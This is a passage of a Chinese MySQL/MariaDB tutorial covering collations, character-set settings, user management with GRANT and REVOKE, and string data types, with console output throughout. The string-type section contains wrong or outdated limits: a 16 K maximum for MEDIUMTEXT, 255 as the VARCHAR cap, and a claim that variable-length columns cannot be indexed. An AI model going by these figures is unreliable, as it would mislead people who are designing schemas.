| 28 | Yes | Yes | 1 || gbk_bin | gbk | 87 | | Yes | 1 || latin5_turkish_ci | latin5 | 30 | Yes | Yes | 1 || latin5_bin | latin5 | 78 | | Yes | 1 || armscii8_general_ci | armscii8 | 32 | Yes | Yes | 1 || armscii8_bin | armscii8 | 64 | | Yes | 1 || utf8_general_ci | utf8 | 33 | Yes | Yes | 1 || utf8_bin | utf8 | 83 | | Yes | 1 || utf8_unicode_ci | utf8 | 192 | | Yes | 8 || utf8_icelandic_ci | utf8 | 193 | | Yes | 8 || utf8_latvian_ci | utf8 | 194 | | Yes | 8 || utf8_romanian_ci | utf8 | 195 | | Yes | 8 || utf8_slovenian_ci | utf8 | 196 | | Yes | 8 || utf8_polish_ci | utf8 | 197 | | Yes | 8 || utf8_estonian_ci | utf8 | 198 | | Yes | 8 || utf8_spanish_ci | utf8 | 199 | | Yes | 8 || utf8_swedish_ci | utf8 | 200 | | Yes | 8 || utf8_turkish_ci | utf8 | 201 | | Yes | 8 || utf8_czech_ci | utf8 | 202 | | Yes | 8 || utf8_danish_ci | utf8 | 203 | | Yes | 8 || utf8_lithuanian_ci | utf8 | 204 | | Yes | 8 || utf8_slovak_ci | utf8 | 205 | | Yes | 8 || utf8_spanish2_ci | utf8 | 206 | | Yes | 8 || utf8_roman_ci | utf8 | 207 | | Yes | 8 || utf8_persian_ci | utf8 | 208 | | Yes | 8 || utf8_esperanto_ci | utf8 | 209 | | Yes | 8 || utf8_hungarian_ci | utf8 | 210 | | Yes | 8 || utf8_sinhala_ci | utf8 | 211 | | Yes | 8 || utf8_croatian_ci | utf8 | 213 | | Yes | 8 || utf8_general_mysql500_ci | utf8 | 223 | | Yes | 1 || ucs2_general_ci | ucs2 | 35 | Yes | Yes | 1 || ucs2_bin | ucs2 | 90 | | Yes | 1 || ucs2_unicode_ci | ucs2 | 128 | | Yes | 8 || ucs2_icelandic_ci | ucs2 | 129 | | Yes | 8 || ucs2_latvian_ci | ucs2 | 130 | | Yes | 8 || ucs2_romanian_ci | ucs2 | 131 | | Yes | 8 || ucs2_slovenian_ci | ucs2 | 132 | | Yes | 8 || ucs2_polish_ci | ucs2 | 133 | | Yes | 8 || ucs2_estonian_ci | ucs2 | 134 | | Yes | 8 || ucs2_spanish_ci | ucs2 | 135 | | Yes | 8 || ucs2_swedish_ci | ucs2 | 136 | | Yes | 8 || ucs2_turkish_ci | ucs2 | 137 | | Yes | 8 || ucs2_czech_ci | ucs2 | 138 | | Yes | 8 || ucs2_danish_ci | ucs2 | 139 | | Yes | 8 || ucs2_lithuanian_ci | ucs2 | 140 | | Yes | 8 || ucs2_slovak_ci | ucs2 | 141 | | Yes | 8 || ucs2_spanish2_ci | ucs2 | 142 | | Yes | 8 || ucs2_roman_ci | ucs2 | 143 | | Yes | 8 || ucs2_persian_ci | ucs2 | 144 | | Yes | 8 || ucs2_esperanto_ci | ucs2 | 145 | | Yes | 8 || ucs2_hungarian_ci | ucs2 | 146 | | Yes | 8 || ucs2_sinhala_ci | ucs2 | 147 | | Yes | 8 || ucs2_croatian_ci | ucs2 | 149 | | Yes | 8 || ucs2_general_mysql500_ci | ucs2 | 159 | | Yes | 1 || cp866_general_ci | cp866 | 36 | Yes | Yes | 1 || cp866_bin | cp866 | 68 | | Yes | 1 || keybcs2_general_ci | keybcs2 | 37 | Yes | Yes | 1 || keybcs2_bin | keybcs2 | 73 | | Yes | 1 || macce_general_ci | macce | 38 | Yes | Yes | 1 || macce_bin | macce | 43 | | Yes | 1 || macroman_general_ci | macroman | 39 | Yes | Yes | 1 || macroman_bin | macroman | 53 | | Yes | 1 || cp852_general_ci | cp852 | 40 | Yes | Yes | 1 || cp852_bin | cp852 | 81 | | Yes | 1 || latin7_estonian_cs | latin7 | 20 | | Yes | 1 || latin7_general_ci | latin7 | 41 | Yes | Yes | 1 || latin7_general_cs | latin7 | 42 | | Yes | 1 || latin7_bin | latin7 | 79 | | Yes | 1 || utf8mb4_general_ci | utf8mb4 | 45 | Yes | Yes | 1 || utf8mb4_bin | utf8mb4 | 46 | | Yes | 1 || utf8mb4_unicode_ci | utf8mb4 | 224 | | Yes | 8 || utf8mb4_icelandic_ci | utf8mb4 | 225 | | Yes | 8 || utf8mb4_latvian_ci | utf8mb4 | 226 | | Yes | 8 || utf8mb4_romanian_ci | utf8mb4 | 227 | | Yes | 8 || utf8mb4_slovenian_ci | utf8mb4 | 228 | | Yes | 8 || utf8mb4_polish_ci | utf8mb4 | 229 | | Yes | 8 || utf8mb4_estonian_ci | utf8mb4 | 230 | | Yes | 8 || utf8mb4_spanish_ci | utf8mb4 | 231 | | Yes | 8 || utf8mb4_swedish_ci | utf8mb4 | 232 | | Yes | 8 || utf8mb4_turkish_ci | utf8mb4 | 233 | | Yes | 8 || utf8mb4_czech_ci | utf8mb4 | 234 | | Yes | 8 || utf8mb4_danish_ci | utf8mb4 | 235 | | Yes | 8 || utf8mb4_lithuanian_ci | utf8mb4 | 236 | | Yes | 8 || utf8mb4_slovak_ci | utf8mb4 | 237 | | Yes | 8 || utf8mb4_spanish2_ci | utf8mb4 | 238 | | Yes | 8 || utf8mb4_roman_ci | utf8mb4 | 239 | | Yes | 8 || utf8mb4_persian_ci | utf8mb4 | 240 | | Yes | 8 || utf8mb4_esperanto_ci | utf8mb4 | 241 | | Yes | 8 || utf8mb4_hungarian_ci | utf8mb4 | 242 | | Yes | 8 || utf8mb4_sinhala_ci | utf8mb4 | 243 | | Yes | 8 || utf8mb4_croatian_ci | utf8mb4 | 245 | | Yes | 8 || cp1251_bulgarian_ci | cp1251 | 14 | | Yes | 1 || cp1251_ukrainian_ci | cp1251 | 23 | | Yes | 1 || cp1251_bin | cp1251 | 50 | | Yes | 1 || cp1251_general_ci | cp1251 | 51 | Yes | Yes | 1 || cp1251_general_cs | cp1251 | 52 | | Yes | 1 || utf16_general_ci | utf16 | 54 | Yes | Yes | 1 || utf16_bin | utf16 | 55 | | Yes | 1 || utf16_unicode_ci | utf16 | 101 | | Yes | 8 || utf16_icelandic_ci | utf16 | 102 | | Yes | 8 || utf16_latvian_ci | utf16 | 103 | | Yes | 8 || utf16_romanian_ci | utf16 | 104 | | Yes | 8 || utf16_slovenian_ci | utf16 | 105 | | Yes | 8 || utf16_polish_ci | utf16 | 106 | | Yes | 8 || utf16_estonian_ci | utf16 | 107 | | Yes | 8 || utf16_spanish_ci | utf16 | 108 | | Yes | 8 || utf16_swedish_ci | utf16 | 109 | | Yes | 8 || utf16_turkish_ci | utf16 | 110 | | Yes | 8 || utf16_czech_ci | utf16 | 111 | | Yes | 8 || utf16_danish_ci | utf16 | 112 | | Yes | 8 || utf16_lithuanian_ci | utf16 | 113 | | Yes | 8 || utf16_slovak_ci | utf16 | 114 | | Yes | 8 || utf16_spanish2_ci | utf16 | 115 | | Yes | 8 || utf16_roman_ci | utf16 | 116 | | Yes | 8 || utf16_persian_ci | utf16 | 117 | | Yes | 8 || utf16_esperanto_ci | utf16 | 118 | | Yes | 8 || utf16_hungarian_ci | utf16 | 119 | | Yes | 8 || utf16_sinhala_ci | utf16 | 120 | | Yes | 8 || utf16_croatian_ci | utf16 | 215 | | Yes | 8 || cp1256_general_ci | cp1256 | 57 | Yes | Yes | 1 || cp1256_bin | cp1256 | 67 | | Yes | 1 || cp1257_lithuanian_ci | cp1257 | 29 | | Yes | 1 || cp1257_bin | cp1257 | 58 | | Yes | 1 || cp1257_general_ci | cp1257 | 59 | Yes | Yes | 1 || utf32_general_ci | utf32 | 60 | Yes | Yes | 1 || utf32_bin | utf32 | 61 | | Yes | 1 || utf32_unicode_ci | utf32 | 160 | | Yes | 8 || utf32_icelandic_ci | utf32 | 161 | | Yes | 8 || utf32_latvian_ci | utf32 | 162 | | Yes | 8 || utf32_romanian_ci | utf32 | 163 | | Yes | 8 || utf32_slovenian_ci | utf32 | 164 | | Yes | 8 || utf32_polish_ci | utf32 | 165 | | Yes | 8 || utf32_estonian_ci | utf32 | 166 | | Yes | 8 || utf32_spanish_ci | utf32 | 167 | | Yes | 8 || utf32_swedish_ci | utf32 | 168 | | Yes | 8 || utf32_turkish_ci | utf32 | 169 | | Yes | 8 || utf32_czech_ci | utf32 | 170 | | Yes | 8 || utf32_danish_ci | utf32 | 171 | | Yes | 8 || utf32_lithuanian_ci | utf32 | 172 | | Yes | 8 || utf32_slovak_ci | utf32 | 173 | | Yes | 8 || utf32_spanish2_ci | utf32 | 174 | | Yes | 8 || utf32_roman_ci | utf32 | 175 | | Yes | 8 || utf32_persian_ci | utf32 | 176 | | Yes | 8 || utf32_esperanto_ci | utf32 | 177 | | Yes | 8 || utf32_hungarian_ci | utf32 | 178 | | Yes | 8 || utf32_sinhala_ci | utf32 | 179 | | Yes | 8 || utf32_croatian_ci | utf32 | 214 | | Yes | 8 || binary | binary | 63 | Yes | Yes | 1 || geostd8_general_ci | geostd8 | 92 | Yes | Yes | 1 || geostd8_bin | geostd8 | 93 | | Yes | 1 || cp932_japanese_ci | cp932 | 95 | Yes | Yes | 1 || cp932_bin | cp932 | 96 | | Yes | 1 || eucjpms_japanese_ci | eucjpms | 97 | Yes | Yes | 1 || eucjpms_bin | eucjpms | 98 | | Yes | 1 |+--------------------------+----------+-----+---------+----------+---------+202 rows in set (0.00 sec)MariaDB [test]&gt; show collation like &apos;%latin1%&apos;;+-------------------+---------+----+---------+----------+---------+| Collation | Charset | Id | Default | Compiled | Sortlen |+-------------------+---------+----+---------+----------+---------+| latin1_german1_ci | latin1 | 5 | | Yes | 1 || latin1_swedish_ci | latin1 | 8 | Yes | Yes | 1 || latin1_danish_ci | latin1 | 15 | | Yes | 1 || latin1_german2_ci | latin1 | 31 | | Yes | 2 || latin1_bin | latin1 | 47 | | Yes | 1 || latin1_general_ci | latin1 | 48 | | Yes | 1 || latin1_general_cs | latin1 | 49 | | Yes | 1 || latin1_spanish_ci | latin1 | 94 | | Yes | 1 |+-------------------+---------+----+---------+----------+---------+8 rows in set (0.00 sec) 此语句显示所有可用的校对,以及它们适用的字符集。可以看到有的字符集具有不止一种校对。例如, latin1 对不同的欧洲语言有几种校对,而且许多校对出现两次,一次区分大小写(由 _cs 表示),一次不区分大小写(由 _ci 表示)。 通常系统管理在安装时定义一个默认的字符集和校对。此外,也可以在创建数据库时,指定默认的字符集和校对。 为了确定所用的字符集和校对,可以使用以下语句: 123456789101112131415161718192021222324MariaDB [test]&gt; show variables like &apos;character%&apos;;+--------------------------+----------------------------+| Variable_name | Value |+--------------------------+----------------------------+| character_set_client | utf8 || character_set_connection | utf8 || character_set_database | latin1 || character_set_filesystem | binary || character_set_results | utf8 || character_set_server | latin1 || character_set_system | utf8 || character_sets_dir | /usr/share/mysql/charsets/ |+--------------------------+----------------------------+8 rows in set (0.00 sec)MariaDB [test]&gt; show variables like &apos;collation%&apos;;+----------------------+-------------------+| Variable_name | Value |+----------------------+-------------------+| collation_connection | utf8_general_ci || collation_database | latin1_swedish_ci || collation_server | latin1_swedish_ci |+----------------------+-------------------+3 rows in set (0.00 sec) 实际上,字符集很少是服务器范围(甚至数据库范围)的设置。不同的表,甚至不同的列都可能需要不同的字符集,而且两者都可以在创建表时指定。 为了给表指定字符集和校对,可使用带子句的 CREATE TABLE : 12MariaDB [test]&gt; create table mytable (columnn1 int,colunmn2 varchar(10)) default character set hebrew collate hebrew_general_ci;Query OK, 0 rows affected (0.49 sec) 此语句创建一个包含两列的表,并且指定一个字符集和一个校对顺序。 这个例子中指定了 CHARACTER SET 和 COLLATE 两者。一般,MySQL如下确定使用什么样的字符集和校对。 如果指定 CHARACTER SET 和 COLLATE 两者,则使用这些值。 如果只指定 CHARACTER SET ,则使用此字符集及其默认的校对(如SHOW CHARACTER SET 的结果中所示)。 如果既不指定 CHARACTER SET ,也不指定 COLLATE ,则使用数据库默认。 除了能指定字符集和校对的表范围外,MySQL还允许对每个列设置它们,如下所示: 12MariaDB [test]&gt; create table mytable1 (coln1 int,coln2 varchar(10),coln3 varchar(10) character set latin1 collate latin1_general_ci) default character set hebrew collate hebrew_general_ci;Query OK, 0 rows affected (0.36 sec) 这里对整个表以及一个特定的列指定了 CHARACTER SET 和 COLLATE 。 如前所述,校对在对用 ORDER BY子句检索出来的数据排序时起重要的作用。如果你需要用与创建表时不同的校对顺序排序特定的 SELECT 语句,可以在 SELECT语句自身中进行: 123456789101112131415161718192021222324252627282930313233343536373839MariaDB [test]&gt; create table db1.t2 (name varchar(10) character set latin1 collate latin1_general_ci);Query OK, 0 rows affected (0.06 sec)MariaDB [test]&gt; insert into db1.t2 values (&apos;a&apos;),(&apos;b&apos;),(&apos;A&apos;),(&apos;B&apos;);Query OK, 4 rows affected (0.07 sec)Records: 4 Duplicates: 0 Warnings: 0MariaDB [test]&gt; select * from db1.t2;+------+| name |+------+| a || b || A || B |+------+4 rows in set (0.00 sec)MariaDB [test]&gt; select * from db1.t2 order by name collate latin1_general_cs;+------+| name |+------+| A || a || B || b |+------+4 rows in set (0.00 sec)MariaDB [test]&gt; select * from db1.t2 order by name;+------+| name |+------+| a || A || b || B |+------+4 rows in set (0.00 sec) 此 SELECT 使用 COLLATE 指定一个备用的校对顺序(在这个例子中,为区分大小写的校对)。这显然将会影响到结果排序的次序。 临时区分大小写 上面的 SELECT 语句演示了在通常不区分大小写的表上进行区分大小写搜索的一种技术。当然,反过来也是可以的。 ELECT 的其他 COLLATE 子句 除了这里看到的在 ORDER BY子句 中使用以外, COLLATE 还可以用于 GROUP BY、 HAVING 、聚集函数、别名等。 最后,值得注意的是,如果绝对需要,串可以在字符集之间进行转换。为此,使用 Cast() 或 Convert ()函数。 小结 本章中,我们学习了字符集和校对的基础知识,还学习了如何对特定的表和列定义字符集和校对,如何在需要时使用备用的校对。 DCL语言 DCL(Data Control Language)语句:数据控制语句,用于控制不同数据段直接的许可和访问级别的语句。这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要的语句关键字包括 grant、revoke 等。 安全管理数据库服务器通常包含关键的数据,确保这些数据的安全和完整需要利用访问控制。本章将学习MySQL的访问控制和用户管理。 访问控制 MySQL服务器的安全基础是:用户应该对他们需要的数据具有适当的访问权,既不能多也不能少。换句话说,用户不能对过多的数据具有过多的访问权。 考虑以下内容: 多数用户只需要对表进行读和写,但少数用户甚至需要能创建和删除表; 某些用户需要读表,但可能不需要更新表; 你可能想允许用户添加数据,但不允许他们删除数据; 某些用户(管理员)可能需要处理用户账号的权限,但多数用户不需要; 你可能想让用户通过存储过程访问数据,但不允许他们直接访问数据; 你可能想根据用户登录的地点限制对某些功能的访问。 这些都只是例子,但有助于说明一个重要的事实,即你需要给用户提供他们所需的访问权,且仅提供他们所需的访问权。这就是所谓的访问控制,管理访问控制需要创建和管理用户账号。 使用MySQL Administrator MySQL Administrator提供了一个图形用户界面,可用来管理用户及账号权限。MySQL Administrator在内部利用本章介绍的语句,使你能交互地、方便地管理访问控制。 我们知道,为了执行数据库操作,需要登录MySQL。MySQL创建一个名为 root 的用户账号,它对整个MySQL服务器具有完全的控制。你可能已经在本书各章的学习中使用 root 进行过登录,在对非现实的数据库试验MySQL时,这样做很好。不过在现实世界的日常工作中,决不能使用 root 。应该创建一系列的账号,有的用于管理,有的供用户使用,有的供开发人员使用,等等。 防止无意的错误 重要的是注意到,访问控制的目的不仅仅是防止用户的恶意企图。数据梦魇更为常见的是无意识错误的结果,如错打MySQL语句,在不合适的数据库中操作或其他一些用户错误。通过保证用户不能执行他们不应该执行的语句,访问控制有助于避免这些情况的发生。 不要使用 root 应该严肃对待 root 登录的使用。仅在绝对需要时使用它(或许在你不能登录其他管理账号时使用)。不应该在日常的MySQL操作中使用 root。 管理用户 MySQL用户账号和信息存储在名为 mysql 的MySQL数据库中。一般不需要直接访问 mysql 数据库和表(你稍后会明白这一点),但有时需要直接访问。需要直接访问它的时机之一是在需要获得所有用户账号列表时。为此,可使用以下代码: 123456789101112131415161718MariaDB [test]&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; select user from user;+------+| user |+------+| root || root || root || || root || || root |+------+7 rows in set (0.00 sec) mysql 数据库有一个名为 user 的表,它包含所有用户账号。 user表有一个名为 user 的列,它存储用户登录名。新安装的服务器可能只有一个用户(如这里所示),过去建立的服务器可能具有很多用户。 用多个客户机进行试验 试验对用户账号和权限进行更改的最好办法是打开多个数据库客户机(如 mysql 命令行实用程序的多个副本),一个作为管理登录,其他作为被测试的用户登录。 1.创建用户账号 为了创建一个新用户账号,使用 CREATE USER 语句,如下所示: 12MariaDB [mysql]&gt; create user superman identified by &apos;p@$$w0rd&apos;;Query OK, 0 rows affected (0.00 sec) CREATE USER 创建一个新用户账号。在创建用户账号时不一定需要口令,不过这个例子用 IDENTIFIED BY &apos;p@$$wOrd&apos; 给出了一个口令。 如果你再次列出用户账号,将会在输出中看到新账号。指定散列口令 IDENTIFIED BY 指定的口令为纯文本, MySQL将在保存到 user 表之前对其进行加密。为了作为散列值指定口令,使用 IDENTIFIED BY PASSWORD 。 使用 GRANT 或 INSERT GRANT 语句(稍后介绍)也可以创建用户账号,但一般来说 CREATE USER 是最清楚和最简单的句子。此外,也可以通过直接插入行到 user 表来增加用户,不过为安全起见,一般不建议这样做。MySQL用来存储用户账号信息的表(以及表模式等)极为重要,对它们的任何毁坏都可能严重地伤害到MySQL服务器。因此,相对于直接处理来说,最好是用标记和函数来处理这些表。 为重新命名一个用户账号,使用 RENAME USER 语句,如下所示: 1234MariaDB [mysql]&gt; rename user superman@&apos;%&apos; to batman;Query OK, 0 rows affected (0.00 sec)MariaDB [mysql]&gt; rename user batman@&apos;%&apos; to superman@&apos;%&apos;;Query OK, 0 rows affected (0.00 sec) MySQL 5之前 仅MySQL 5或之后的版本支持 RENAME USER 。为了在以前的MySQL中重命名一个用户,可使用 UPDATE直接更新 user 表。 2.删除用户账号 为了删除一个用户账号(以及相关的权限),使用 DROP USER 语句,如下所示: 12MariaDB [mysql]&gt; drop user superman;Query OK, 0 rows affected (0.00 sec) MySQL 5之前 自MySQL 5以来, DROP USER 删除用户账号和所有相关的账号权限。在MySQL 5以前, DROP USER 只能用来删除用户账号,不能删除相关的权限。因此,如果使用旧版本的MySQL,需要先用 REVOKE 删除与账号相关的权限,然后再用 DROP USER 删除账号。 3.设置访问权限 在创建用户账号后,必须接着分配访问权限。新创建的用户账号没有访问权限。它们能登录MySQL,但不能看到数据,不能执行任何数据库操作。 为看到赋予用户账号的权限,使用 SHOW GRANTS FOR ,如下所示: 12345678910MariaDB [mysql]&gt; create user &apos;wonderwoman&apos;@&apos;172.25.0.12&apos;;Query OK, 0 rows affected (0.00 sec)MariaDB [mysql]&gt; show grants for &apos;wonderwoman&apos;@&apos;172.25.0.12&apos;;+---------------------------------------------------+| Grants for wonderwoman@172.25.0.12 |+---------------------------------------------------+| GRANT USAGE ON *.* TO &apos;wonderwoman&apos;@&apos;172.25.0.12&apos; |+---------------------------------------------------+1 row in set (0.00 sec) 输出结果显示用户 wonderwoman 有一个权限 USAGE ON *.* 。USAGE 表示根本没有权限(我知道,这不很直观),所以,此结果表示在任意数据库和任意表上对任何东西没有权限。 用户定义为 user@host MySQL的权限用用户名和主机名结合定义。如果不指定主机名,则使用默认的主机名 % (授予用户访问权限而不管主机名)。 为设置权限,使用 GRANT 语句。 GRANT 要求你至少给出以下信息: 要授予的权限; 被授予访问权限的数据库或表; 用户名。 以下例子给出 GRANT 的用法: 1234567891011MariaDB [mysql]&gt; grant select on db1.* to &apos;wonderwoman&apos;@&apos;172.25.0.12&apos;;Query OK, 0 rows affected (0.00 sec)MariaDB [mysql]&gt; show grants for &apos;wonderwoman&apos;@&apos;172.25.0.12&apos;;+--------------------------------------------------------+| Grants for wonderwoman@172.25.0.12 |+--------------------------------------------------------+| GRANT USAGE ON *.* TO &apos;wonderwoman&apos;@&apos;172.25.0.12&apos; || GRANT SELECT ON `db1`.* TO &apos;wonderwoman&apos;@&apos;172.25.0.12&apos; |+--------------------------------------------------------+2 rows in set (0.00 sec) 此 GRANT 允许用户在 db1.* ( db1 数据库的所有表)上使用 SELECT。通过只授予 SELECT 访问权限,用户 wonderwoman对 db1 数据库中的所有数据具有只读访问权限。 每个 GRANT 添加(或更新)用户的一个权限。MySQL读取所有授权,并根据它们确定权限。 GRANT 的反操作为 REVOKE ,用它来撤销特定的权限。下面举一个例子: 12345678910MariaDB [mysql]&gt; revoke select on db1.* from &apos;wonderwoman&apos;@&apos;172.25.0.12&apos;;Query OK, 0 rows affected (0.00 sec)MariaDB [mysql]&gt; show grants for &apos;wonderwoman&apos;@&apos;172.25.0.12&apos;;+---------------------------------------------------+| Grants for wonderwoman@172.25.0.12 |+---------------------------------------------------+| GRANT USAGE ON *.* TO &apos;wonderwoman&apos;@&apos;172.25.0.12&apos; |+---------------------------------------------------+1 row in set (0.00 sec) 这条 REVOKE 语句取消刚赋予用户 wonderwoman 的 SELECT 访问权限。被撤销的访问权限必须存在,否则会出错。 GRANT 和 REVOKE 可在几个层次上控制访问权限: 整个服务器,使用 GRANT ALL 和 REVOKE ALL; 整个数据库,使用 ON database.*; 特定的表,使用 ON database.table; 特定的列; 特定的存储过程。 下表列出可以授予或撤销的每个权限。 权限 说明 ALL 除GRANT OPTION外的所有权限 ALTER 使用ALTER TABLE ALTER ROUTINE 使用ALTER PROCEDURE和DROP PROCEDURE CREATE 使用CREATE TABLE CREATE ROUTINE 使用CREATE PROCEDURE CREATE TEMPORARY TABLES 使用CREATE TEMPORARY TABLE CREATE USER 使用CREATE USER、 DROP USER、 RENAME USER和REVOKE ALL PRIVILEGES CREATE VIEW 使用CREATE VIEW DELETE 使用DELETE DROP 使用DROP TABLE EXECUTE 使用CALL和存储过程 FILE 使用SELECT INTO OUTFILE和LOAD DATA INFILE GRANT OPTION 使用GRANT和REVOKE INDEX 使用CREATE INDEX和DROP INDEX INSERT 使用INSERT LOCK TABLES 使用LOCK TABLES PROCESS 使用SHOW FULL PROCESSLIST RELOAD 使用FLUSH REPLICATION CLIENT 服务器位置的访问 REPLICATION SLAVE 由复制从属使用 SELECT 使用SELECT SHOW DATABASES 使用SHOW DATABASES SHOW VIEW 使用SHOW CREATE VIEW SHUTDOWN 使用mysqladmin shutdown(用来关闭MySQL) SUPER 使用CHANGE MASTER、KILL、LOGS、PURGE、MASTER和SET GLOBAL。还允许mysqladmin调试登录 UPDATE 使用UPDATE USAGE 无访问权限 使用 GRANT 和 REVOKE ,再结合上表中列出的权限,你能对用户可以就你的宝贵数据做什么事情和不能做什么事情具有完全的控制。 未来的授权 在使用 GRANT 和 REVOKE 时,用户账号必须存在,但对所涉及的对象没有这个要求。这允许管理员在创建数据库和表之前设计和实现安全措施。 这样做的副作用是,当某个数据库或表被删除时(用 DROP 语句),相关的访问权限仍然存在。而且,如果将来重新创建该数据库或表,这些权限仍然起作用。 简化多次授权 可通过列出各权限并用逗号分隔,将多条GRANT 语句串在一起,如下所示:grant select,insert on db1.* to &apos;wonderwoman&apos;@&apos;172.25.0.12&apos;; 4.更改口令 为了更改用户口令,可使用 SET PASSWORD 语句。新口令必须如下加密: 12345MariaDB [mysql]&gt; create user bforta;Query OK, 0 rows affected (0.00 sec)MariaDB [mysql]&gt; set password for bforta = password(&apos;uplooking&apos;);Query OK, 0 rows affected (0.00 sec) SET PASSWORD 更新用户口令。新口令必须传递到 Password() 函数进行加密。 SET PASSWORD 还可以用来设置你自己的口令:set password = password(&apos;uplooking&apos;); 在不指定用户名时, SET PASSWORD 更新当前登录用户的口令。 小结 本章学习了通过赋予用户特殊的权限进行访问控制和保护MySQL服务器。 其他MySQL语句的语法 通过帮助可以查看mysql的语法 12345678910111213141516171819202122232425262728293031323334MariaDB [mysql]&gt; help;General information about MariaDB can be found athttp://mariadb.orgList of all MySQL commands:Note that all text commands must be first on line and end with &apos;;&apos;? (\\?) Synonym for `help&apos;.clear (\\c) Clear the current input statement.connect (\\r) Reconnect to the server. Optional arguments are db and host.delimiter (\\d) Set statement delimiter.edit (\\e) Edit command with $EDITOR.ego (\\G) Send command to mysql server, display result vertically.exit (\\q) Exit mysql. Same as quit.go (\\g) Send command to mysql server.help (\\h) Display this help.nopager (\\n) Disable pager, print to stdout.notee (\\t) Don&apos;t write into outfile.pager (\\P) Set PAGER [to_pager]. Print the query results via PAGER.print (\\p) Print current command.prompt (\\R) Change your mysql prompt.quit (\\q) Quit mysql.rehash (#) Rebuild completion hash.rehash (#) Rebuild completion hash.source (\\.) Execute an SQL script file. Takes a file name as an argument.status (\\s) Get status information from the server.system (\\!) Execute a system shell command.tee (\\T) Set outfile [to_outfile]. Append everything into given outfile.use (\\u) Use another database. Takes database name as argument.charset (\\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.warnings (\\W) Show warnings after every statement.nowarning (\\w) Don&apos;t show warnings after every statement.For server side help, type &apos;help contents&apos; 查看create和create database的帮助 1234567891011121314151617181920212223242526272829303132333435363738394041MariaDB [mysql]&gt; help create;Many help items for your request exist.To make a more specific request, please type &apos;help &lt;item&gt;&apos;,where &lt;item&gt; is one of the followingtopics: CREATE DATABASE CREATE EVENT CREATE FUNCTION CREATE FUNCTION UDF CREATE INDEX CREATE PROCEDURE CREATE SERVER CREATE TABLE CREATE TABLESPACE CREATE TRIGGER CREATE USER CREATE VIEW SHOW SHOW CREATE DATABASE SHOW CREATE EVENT SHOW CREATE FUNCTION SHOW CREATE PROCEDURE SHOW CREATE TABLE SPATIALMariaDB [mysql]&gt; help create database;Name: &apos;CREATE DATABASE&apos;Description:Syntax:CREATE {DATABASE | SCHEMA} [IF NOT EXISTS] db_name [create_specification] ...create_specification: [DEFAULT] CHARACTER SET [=] charset_name | [DEFAULT] COLLATE [=] collation_nameCREATE DATABASE creates a database with the given name. To use thisstatement, you need the CREATE privilege for the database. CREATESCHEMA is a synonym for CREATE DATABASE.URL: http://dev.mysql.com/doc/refman/5.5/en/create-database.html 下表罗列出常见的DDL、DML、DCL、DQL的用法： 12345678910111213141516171819202122232425262728DDL 数据库定义语言 create\\drop\\alter create database [dbname]; drop database [dbname]; create table [tbname] (col1 type,col2 type,col3....); drop table [tbname];DML 数据库操作语言 insert into\\delete from\\update insert into [tbname] set col1=value,col2=value,col3=value; insert into [tbname] values (1,&apos;booboo&apos;),(2,&apos;batman&apos;),(3,&apos;superman&apos;); insert into [tbname] (name,id) values (); delete from [tbname] where id=1 and name=&apos;booboo&apos;; update [tbname] set col=&apos;superman&apos; where id=2;DCL 数据库控制语言 grant revoke 认证 + 授权 grant all on *.* to booboo@&apos;172.25.0.11&apos; identified by &apos;uplooking&apos;; all 权限 *.* 库.表 flush privileges; 刷新授权表 revoke [权限] on [库].[表] from booboo@&apos;172.25.0.11&apos;;DQL 数据库查询语言 show databases; use mysql; show tables; desc mysql.user; select * from db1.t1; MySQL数据类型数据类型是定义列中可以存储什么数据以及该数据实际怎样存储的基本规则。 数据类型用于以下目的。 数据类型允许限制可存储在列中的数据。例如,数值数据类型列只能接受数值。 数据类型允许在内部更有效地存储数据。可以用一种比文本串更简洁的格式存储数值和日期时间值。 数据类型允许变换排序顺序。如果所有数据都作为串处理,则1位于10之前,而10又位于2之前(串以字典顺序排序,从左边开始比较,一次一个字符)。作为数值数据类型,数值才能正确排序。 在设计表时,应该特别重视所用的数据类型。使用错误的数据类型可能会严重地影响应用程序的功能和性能。更改包含数据的列不是一件小事(而且这样做可能会导致数据丢失)。 本章虽然不是关于数据类型及其如何使用的一个完整的教材,但介绍了MySQL主要的数据类型和用途。 串数据类型 最常用的数据类型是串数据类型。它们存储串,如名字、地址、电话号码、邮政编码等。有两种基本的串类型,分别为定长串和变长串。 定长串接受长度固定的字符串,其长度是在创建表时指定的。例如,名字列可允许30个字符,而社会安全号列允许11个字符(允许的字符数目中包括两个破折号)。定长列不允许多于指定的字符数目。它们分配的存储空间与指定的一样多。因此,如果串 Ben 存储到30个字符的名字字段,则存储的是30个字符, CHAR 属于定长串类型。 变长串存储可变长度的文本。有些变长数据类型具有最大的定长,而有些则是完全变长的。不管是哪种,只有指定的数据得到保存(额外的数据不保存) TEXT 属于变长串类型。 既然变长数据类型这样灵活,为什么还要使用定长数据类型?回答是因为性能。MySQL处理定长列远比处理变长列快得多。此外,MySQL不允许对变长列(或一个列的可变部分)进行索引。这也会极大地影响性能。 串数据类型 说明 CHAR 1~255个字符的定长串。它的长度必须在创建时指定,否则MySQL假定为CHAR(1) ENUM 接受最多64 K个串组成的一个预定义集合的某个串 LONGTEXT 与TEXT相同,但最大长度为4 GB MEDIUMTEXT 与TEXT相同,但最大长度为16 K SET 接受最多64个串组成的一个预定义集合的零个或多个串 TEXT 最大长度为64 K的变长文本 TINYTEXT 与TEXT相同,但最大长度为255字节 VARCHAR 长度可变,最多不超过255字节。如果在创建时指定为VARCHAR(n),则可存储0到n个字符的变长串(其中n≤255) 使用引号 不管使用何种形式的串数据类型,串值都必须括在引号内(通常单引号更好)。 当数值不是数值时 你可能会认为电话号码和邮政编码应该存储在数值字段中(数值字段只存储数值数据),但是,这样做却是不可取的。如果在数值字段中存储邮政编码01234,则保存的将是数值1234,实际上丢失了一位数字。 需要遵守的基本规则是:如果数值是计算(求和、平均等)中使用的数值,则应该存储在数值数据类型列中。如果作为字符串(可能只包含数字)使用,则应该保存在串数据类型列中。 数值数据类型 数值数据类型存储数值。MySQL支持多种数值数据类型,每种存储的数值具有不同的取值范围。显然,支持的取值范围越大,所需存储空间越多。此外,有的数值数据类型支持使用十进制小数点(和小数),而有的则只支持整数。下表列出了常用的MySQL数值数据类型。 有符号或无符号 所有数值数据类型(除 BIT 和 BOOLEAN 